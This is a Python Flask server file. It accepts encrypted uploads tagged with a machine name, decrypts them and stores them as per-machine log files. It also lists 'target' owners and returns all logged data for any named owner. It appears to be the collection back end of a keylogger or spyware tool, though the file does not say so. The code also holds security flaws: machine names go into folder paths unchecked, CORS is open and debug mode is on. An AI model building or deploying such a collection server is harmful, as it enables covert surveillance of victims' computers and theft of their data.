import os
from flask import Flask, request, jsonify
from flask_cors import CORS
import logging
from pathlib import Path

from utilities import file_utils
from utilities import help_utils
from utilities import config
from utilities import encryption_utils

app = Flask(__name__)
CORS(app)

logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(message)s', filename='log.txt', filemode='w')


@app.route('/api/upload', methods=['POST'])
def upload_data():
    """
    Gets the posted data and manages storing it in the database.
    :return The status of the HTTP request.:
    """
    data = request.data
    try:
        machine_name = data[:14].decode('utf-8')
        machine_folder = file_utils.create_machine_folder(machine_name)
        decrypted_data =  encryption_utils.Decryption(config.KEY).decrypt(data[15:])
    except Exception as e:
        logging.error(e)
        return jsonify({'status': False, 'message': str(e)}), 400
    if not decrypted_data:
        logging.info('No data received to the server.')
        return jsonify({'message': 'No input decrypted_data provided'}), 400

    log_data, data = help_utils.split_data(decrypted_data)

    file_path = os.path.join(machine_folder, file_utils.generate_log_filename())
    with open(file_path, 'a') as f:
        f.write("--- "+log_data + ' ---\n' + data + '\n' * 2 )
    logging.info('Data saved to ' + file_path)
    return jsonify({"status": "success", "file": file_path}), 200


@app.route('/api/list_machines_target_get', methods=['GET'])
def list_machines():
    if not os.path.exists(config.DATA_FOLDER):
        return jsonify([]), 400
    machines = file_utils.get_machine_name_list()
    if not machines:
        return jsonify([]), 400
    names_of_owners = help_utils.get_list_of_owners(machines)
    encrypted_owners = encryption_utils.encrypt_data(names_of_owners)
    return jsonify(encrypted_owners),200

@app.route('/api/computer_data/<owner_name>', methods=['GET'])
def computer_data(owner_name):
    try:
        computer_name = file_utils.get_machine_name(owner_name)
    except:
        return jsonify({'status': False, 'message': 'Machine not found'}), 400
    all_data = dict()
    all_data_final = dict()
    folder_path = Path(config.CURRENT_FOLDER+"/data/" + computer_name)
    for file in folder_path.iterdir():
        file_str = str(file)
        if "log" in file_str:
            idx_file_name = file_str.find("log_")
            all_data[file_str[idx_file_name:]] = help_utils.data_pull(file_str)
    all_data_final[owner_name] = all_data
    return jsonify(all_data_final), 200

if __name__ == '__main__':
    app.run(debug=True)







